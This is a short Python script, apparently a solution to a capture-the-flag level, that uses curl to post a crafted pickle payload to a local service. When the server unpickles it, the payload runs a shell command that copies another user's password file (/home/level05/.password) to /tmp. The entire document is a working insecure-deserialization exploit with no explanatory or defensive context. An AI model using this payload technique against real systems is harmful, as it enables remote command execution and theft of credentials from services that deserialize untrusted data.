import pickle, os
HOST = 'localhost:9020'

os.execve("/usr/bin/curl", ['', HOST, '-d', \
    "bla; job: cos\nsystem\n(S'cat /home/level05/.password \
    > /tmp/pass'\ntR."], {})
